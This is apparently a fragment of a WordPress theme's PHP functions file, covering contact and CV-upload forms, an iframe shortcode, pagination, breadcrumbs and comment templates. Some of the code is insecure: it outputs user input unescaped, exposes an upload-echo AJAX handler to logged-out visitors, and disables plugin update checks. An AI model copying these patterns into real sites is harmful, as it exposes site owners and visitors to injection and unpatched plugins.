				if (ctrlDown && (e.keyCode == vKey || e.keyCode == cKey)) {
					//alert('copy/paste is not allowed.');
					return false;
				}
			});
		});
		</script>

		<div class='contact-wrapper'>

						<div class='body-inner-main-top'>
                                   <h4>".$title."</h4>
								   
								   <div class='mosquitocf_error' style='max-width: ".$width."; text-align: left; margin: 0 auto;'></div>
									<div class='mosquitocf_result'></div>
								   
                                   <form class='form-horizontal' method='post' id='mosquitocf' name='mosquitocf' action='#' style='max-width: ".$width."; text-align: left; margin: 0 auto;'>
                                            
											
											<div class='row'>
										   <div class='col-sm-6'>
											  <input type='text' class='form-control'";  
											  if($language=="en")
												$output.="placeholder='Name'";
											  if($language=="fr")
											  	$output.="placeholder='Nom Complet'";
											   
											  $output.=" name='uname' />
										   </div> 
										   <div class='col-sm-6'>
											  <input type='text' class='form-control mrt-p-25' ";  
											  if($language=="en")
												$output.="placeholder='Phone no'";
											  if($language=="fr")
											  	$output.="placeholder='Téléphone'";
											   
											  $output.=" name='phone' />
										   </div> 
									   </div>
									   <input type='text' class='form-control form-mrt-30' ";  
											  if($language=="en")
												$output.="placeholder='Email'";
											  if($language=="fr")
											  	$output.="placeholder='Adresse Courriel'";
											   
											  $output.=" name='email' />
									   <textarea class='form-control form-mrt-30' ";  
											  if($language=="en")
												$output.="placeholder='Message'";
											  if($language=="fr")
											  	$output.="placeholder='Message'";
											   
											  $output.=" style='height:100px;' name='message'></textarea>
									   <input type='button' class='btn-submit transition form-mrt-30' ";  
											  if($language=="en")
												$output.="value='SUBMIT'";
											  if($language=="fr")
											  	$output.="value='SOUMETTRE'";
											   
											  $output.=" onclick='chkv_cf();' />
											
											
											
                                   </form>
                            </div>
							
							</div>";
							
							return $output;
}
add_shortcode("mosquito_quick_contact_form","mosquito_quick_contact_form_function");


function iframe_function( $atts, $content="" ) {
     extract( shortcode_atts( array(
		'url' => '',
		'height' => ''
	), $atts ) );
	
	return "<iframe src='".$url."' width='100%' height='".$height."' frameborder='0' style='border:0'></iframe>";
}
add_shortcode( 'iframe', 'iframe_function' );


function service_block_function( $atts, $content="" ) {
	
	$output="<div class='services'>";
	
	$i=0;
	$args = array( 'post_type' => 'page', 'meta_key' => 'service', 'orderby' => 'meta_value_num', 'order' => 'ASC' );
	$loop = new WP_Query( $args );
	$count=$loop->post_count;
	while ( $loop->have_posts() ) : $loop->the_post(); 
	
		$post_thumbnail_id = get_post_thumbnail_id( $post_id );
		$image_arr = wp_get_attachment_image_src( $post_thumbnail_id, "full" );
		
		if($i==0) {
			$output.="<div class='serv_full'><a href='".get_permalink()."'><img src='".$image_arr[0]."' /><div></div><span>".get_the_title()."</span></a></div>";
		} else {
			$output.="<div class='serv_half'><a href='".get_permalink()."'><img src='".$image_arr[0]."' /><div></div><span>".get_the_title()."</span></a></div>";
		}
	
	$i++;
	endwhile;	
	wp_reset_query();
	
	$output.="<div class='clearfix'></div>
          </div><!--services ends-->";
	
	return $output;
}
add_shortcode( 'service_block', 'service_block_function' );


function wpex_clean_shortcodes($content){   
$array = array (
    '<p>[' => '[', 
    ']</p>' => ']', 
    ']<br />' => ']'
);
$content = strtr($content, $array);
return $content;
}
add_filter('the_content', 'wpex_clean_shortcodes');




add_filter('widget_text', 'do_shortcode');

//remove_filter('pre_term_description', 'wp_filter_kses');


add_post_type_support( 'page', 'excerpt' );


add_filter( 'post_thumbnail_html', 'remove_thumbnail_dimensions', 10 );
add_filter( 'image_send_to_editor', 'remove_thumbnail_dimensions', 10 );

function remove_thumbnail_dimensions( $html ) {
    $html = preg_replace( '/(width|height)=\"\d*\"\s/', "", $html );
    return $html;
}
//add_filter( 'woocommerce_enqueue_styles', '__return_false' );
remove_action('load-update-core.php','wp_update_plugins');
add_filter('pre_site_transient_update_plugins','__return_null');




function the_breadcrumb() {
        echo '<ul id="breadcrumbs">';
    if (!is_home()) {
        echo '<li><a href="';
        echo get_option('home');
        echo '">';
        echo 'Home';
        echo "</a></li>";
        if (is_category() || is_single()) {
            echo '<li>';
            the_category(' </li><li> ');
            if (is_single()) {
                echo "</li><li>";
                the_title();
                echo '</li>';
            }
        } elseif (is_page()) {
            echo '<li>';
            echo the_title();
            echo '</li>';
        }
    }
    elseif (is_tag()) {single_tag_title();}
    elseif (is_day()) {echo"<li>Archive for "; the_time('F jS, Y'); echo'</li>';}
    elseif (is_month()) {echo"<li>Archive for "; the_time('F, Y'); echo'</li>';}
    elseif (is_year()) {echo"<li>Archive for "; the_time('Y'); echo'</li>';}
    elseif (is_author()) {echo"<li>Author Archive"; echo'</li>';}
    elseif (isset($_GET['paged']) && !empty($_GET['paged'])) {echo "<li>Blog Archives"; echo'</li>';}
    elseif (is_search()) {echo"<li>Search Results"; echo'</li>';}
    echo '</ul>';
}
function pagination($pages = '', $range = 2)
{
     $showitems = ($range * 2)+1; 
 
     global $paged;
     if(empty($paged)) $paged = 1;
 
     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }  
 
     if(1 != $pages)
     {
         echo "<div class=\"page-no\"><span class=\"page-no-info\">Page ".$paged." of ".$pages." </span>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo; First</a>";
         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo; Previous</a>";
 
         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                 echo ($paged == $i)? "<span>".$i."</span>":"<a href='".get_pagenum_link($i)."'>".$i."</a>";
             }
         }
 
         if ($paged < $pages && $showitems < $pages) echo "<a href=\"".get_pagenum_link($paged + 1)."\">Next &rsaquo;</a>";
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>Last &raquo;</a>";
         echo "</div>\n";
     }
}
function pagination2($pages = '', $range = 1)

{

     $showitems = ($range * 1)+1; 

 

     global $paged;

     if(empty($paged)) $paged = 1;

 

     if($pages == '')

     {

         global $wp_query;

         $pages = $wp_query->max_num_pages;

         if(!$pages)

         {

             $pages = 1;

         }

     }  

 

     if(1 != $pages)

     {

         echo "<div class=\"page-no\">";

         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo; First</a>";

         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'><</a>";

 

         for ($i=1; $i <= $pages; $i++)

         {

             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))

             {

                 echo ($paged == $i)? "<span>".$i."</span>":"<a href='".get_pagenum_link($i)."'>".$i."</a>";

             }

         }

 

         if ($paged < $pages && $showitems < $pages) echo "<a href=\"".get_pagenum_link($paged + 1)."\">></a>";

         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>Last &raquo;</a>";

         echo "</div>\n";

     }

}
function lowry_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case '' :
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<div id="comment-<?php comment_ID(); ?>">
		<div class="comment-author vcard">
			<div class="avatar-cont"><?php echo get_avatar( $comment, 60 ); ?></div>
			<b><?php printf( __( '%s <span class="says">says:</span>'), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?></b>
            <br />
            <?php
				/* translators: 1: date, 2: time */
				printf( __( '%1$s at %2$s' ), get_comment_date(),  get_comment_time() ); ?><?php edit_comment_link( __( '(Edit)' ), ' ' );
			?>
            
            <div style="clear: both"></div>
		</div><!-- .comment-author .vcard -->
		<?php if ( $comment->comment_approved == '0' ) : ?>
			<br /><em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.'); ?></em>
			<br />
		<?php endif; ?>

		<!--<div class="comment-meta commentmetadata"><a href="<?php //echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">
			<?php
				/* translators: 1: date, 2: time */
				//printf( __( '%1$s at %2$s' ), get_comment_date(),  get_comment_time() ); ?></a><?php //edit_comment_link( __( '(Edit)' ), ' ' );
			?>
		</div>--><!-- .comment-meta .commentmetadata -->

		<div class="comment-body"><?php comment_text(); ?></div>

		<div class="reply">
			<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
		</div><!-- .reply -->
	</div><!-- #comment-##  -->

	<?php
			break;
		case 'pingback'  :
		case 'trackback' :
	?>
	<li class="post pingback">
		<p><?php _e( 'Pingback:' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( '(Edit)' ), ' ' ); ?></p>
	<?php
			break;
	endswitch;
}
function my_mce4_options( $init ) {
$default_colours = '
    "000000", "Black",        "993300", "Burnt orange", "333300", "Dark olive",   "003300", "Dark green",   "003366", "Dark azure",   "000080", "Navy Blue",      "333399", "Indigo",       "333333", "Very dark gray", 
    "800000", "Maroon",       "FF6600", "Orange",       "808000", "Olive",        "008000", "Green",        "008080", "Teal",         "0000FF", "Blue",           "666699", "Grayish blue", "808080", "Gray", 
    "FF0000", "Red",          "FF9900", "Amber",        "99CC00", "Yellow green", "339966", "Sea green",    "33CCCC", "Turquoise",    "3366FF", "Royal blue",     "800080", "Purple",       "999999", "Medium gray", 
    "FF00FF", "Magenta",      "FFCC00", "Gold",         "FFFF00", "Yellow",       "00FF00", "Lime",         "00FFFF", "Aqua",         "00CCFF", "Sky blue",       "993366", "Brown",        "C0C0C0", "Silver", 
    "FF99CC", "Pink",         "FFCC99", "Peach",        "FFFF99", "Light yellow", "CCFFCC", "Pale green",   "CCFFFF", "Pale cyan",    "99CCFF", "Light sky blue", "CC99FF", "Plum",         "FFFFFF", "White"
';
/*$custom_colours = '
    "3a8df9", "h5 blue", "d83131", "Color 2 Name", "ed1c24", "Color 3 Name", "f99b1c", "Color 4 Name", "50b848", "Color 5 Name", "00a859", "Color 6 Name",   "00aae7", "Color 7 Name", "282828", "Color 8 Name"
';*/
$custom_colours = '"3a8df9", "h5 blue"';
$init['textcolor_map'] = '['.$default_colours.','.$custom_colours.']'; // build colour grid default+custom colors
$init['textcolor_rows'] = 6; // enable 6th row for custom colours in grid
return $init;
}
//add_filter('tiny_mce_before_init', 'my_mce4_options');







/* Define the custom box */
//add_action( 'add_meta_boxes', 'myplugin_add_custom_box' );

/* Do something with the data entered */
//add_action( 'save_post', 'myplugin_save_postdata' );

/* Adds a box to the main column on the Post and Page edit screens */
function myplugin_add_custom_box() {
  add_meta_box( 'wp_editor_test_1_box', 'WP Editor Test #1 Box', 'wp_editor_meta_box' );
}

/* Prints the box content */
function wp_editor_meta_box( $post ) {

  // Use nonce for verification
  wp_nonce_field( plugin_basename( __FILE__ ), 'myplugin_noncename' );

  $field_value = get_post_meta( $post->ID, '_wp_editor_test_1', false );
  wp_editor( $field_value[0], '_wp_editor_test_1' );
}

/* When the post is saved, saves our custom data */
function myplugin_save_postdata( $post_id ) {

  // verify if this is an auto save routine. 
  // If it is our form has not been submitted, so we dont want to do anything
  if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) 
      return;

  // verify this came from the our screen and with proper authorization,
  // because save_post can be triggered at other times
  if ( ( isset ( $_POST['myplugin_noncename'] ) ) && ( ! wp_verify_nonce( $_POST['myplugin_noncename'], plugin_basename( __FILE__ ) ) ) )
      return;

  // Check permissions
  if ( ( isset ( $_POST['post_type'] ) ) && ( 'page' == $_POST['post_type'] )  ) {
    if ( ! current_user_can( 'edit_page', $post_id ) ) {
      return;
    }    
  }
  else {
    if ( ! current_user_can( 'edit_post', $post_id ) ) {
      return;
    }
  }

  // OK, we're authenticated: we need to find and save the data
  if ( isset ( $_POST['_wp_editor_test_1'] ) ) {
    update_post_meta( $post_id, '_wp_editor_test_1', $_POST['_wp_editor_test_1'] );
  }

}
function cefa_career_form_function($atts, $content = null) {
$output="";
if(isset($_FILES['cv'])) {
	
	if (!function_exists('wp_handle_upload'))
	{ 
		 require_once( ABSPATH . '/wp-admin/includes/file.php' );
	}
	$uploadedfile = $_FILES['cv'];
	$upload_overrides = array( 'test_form' => false );
	$movefile = wp_handle_upload( $uploadedfile, $upload_overrides );
	$attachments = $movefile;
	if ( empty($movefile['error']) ) {
		wp_mail(get_option("admin_email"), "Job search & career", "From: ".get_option("home")."\r\n", "", $attachments['file']); 
		$output.="Your cv has been sent. We will respond as soon as possible.";
	} else {
		$output.="Sorry, sending failed. Please try again.";
	}  
} else {
$output.="<script type='text/javascript'>
		function chkv_cf() {
		
			var cv = jQuery.trim(document.cefa_cv.cv.value);
			var ext = cv.substr((cv.lastIndexOf('.') +1));
			
			var err_txt=\"\";
			var error=0;
			
			if(cv==\"\")
			{
				var err_txt= err_txt+\"Please select your cv.<br />\";
				var error=1;
			} else {
				if(!(ext==\"doc\" || ext==\"txt\" || ext==\"pdf\" || ext==\"zip\"))
				{
					var err_txt= err_txt+\"Only .doc, .txt, .pdf file is allowed.<br />\";
					var error=1;
				}
			}
				
			
			if(err_txt!=\"\")
				jQuery('.cefa_error').html('<p>'+err_txt+'</p>');
			else
				jQuery('.cefa_error').html('');
			
			if(error==0)
				return true;
			else
				return false;
		
		
		}
		
		</script>
		<div class='cefa_error'></div>
		<form name='cefa_cv' method='post' enctype='multipart/form-data'>
			<div id='comment-input'>
				<label for='cv'>Upload your cv<span class='required'>*</span> :</label>
				<input type='file' name='cv' id='cv' value='' />
			</div>
			<label> </label><input type='submit' class='button default button-round small' value='Send' onclick='return chkv_cf();' />
		</form>";
}
return $output;
}
add_shortcode("cefa_career_form","cefa_career_form_function");
function focuscf_ajx2() {
$output="";
$uname=$_POST['uname'];
$photo=$_FILES['photo']['name'];
$size=$_FILES['photo']['size'];
$type=$_FILES['photo']['type'];
$output.=$uname." | file: ".$photo." | size: ".$size." | type:".$type;
$return["output"] = $output;
echo json_encode($return);
exit();
}
add_action("wp_ajax_nopriv_focuscf_ajx2","focuscf_ajx2");
add_action("wp_ajax_focuscf_ajx2","focuscf_ajx2");
function gamboa_contact_form2_function($atts, $content = null) {
return "<script type='text/javascript'>
		function chkv_cf() {
					
			var err_txt=\"\";
			var error=0;
			
			if(error==0) { // ok
			
				var data = new FormData();
				data.append( 'uname', $('form#focuscf input[name=\"uname\"]').val()  );
				data.append( 'photo', $('#file')[0].files[0] );
				data.append( 'action', 'focuscf_ajx2' );

				$.ajax({
					type: 'POST',
					url: '".get_bloginfo('url')."/wp-admin/admin-ajax.php',
					dataType: 'json',
					data: data,
					cache: false,
					contentType: false,
					processData: false,
					success: function(res){
						$('.result').html(res.output);
						document.getElementById('focuscf').reset();
					}
					
				});
				
			} // ok
			
			return false;
			
		}
		</script>
		<div class='quick-contact $class'>
		<form name='focuscf' id='focuscf' method='post' action='#' enctype='multipart/form-data'>
				<div class='result'></div>
                <div><input type='text' name='uname' value='' placeholder='Name' /></div>
                <div><input type='file' id='file' name='photo' value='' placeholder='photo' /></div>
                <div class='submit'><input type='submit' value='SEND      ' onclick='return chkv_cf();' /></div>
            </form>
			<div class='clear'></div>
        </div><!--quick-contact ends-->";
}
add_shortcode("gamboa_contact_form2","gamboa_contact_form2_function");
//add_action( 'add_meta_boxes', 'event_date' );
        function event_date() {
                add_meta_box( 'event-date', 'Event Date', 'event_date_field', 'post', 'side', 'high' );
                }

            function event_date_field( $post ) {
                $event_date = get_post_meta( $post->ID, '_event_date', true);
                echo 'Please enter the date: ';
                ?>
                <input type="text" name="event_date" value="<?php echo esc_attr( $event_date ); ?>" />
                <br />If you select event category then it is visible.
                <?php
        }
//add_action( 'save_post', 'event_date_save_meta' );
        function event_date_save_meta( $post_ID ) {
            global $post;
            if( $post->post_type == "post" ) {
            if (isset( $_POST ) ) {
                update_post_meta( $post_ID, '_event_date', strip_tags( $_POST['event_date'] ) );
            }
        }
        }
?>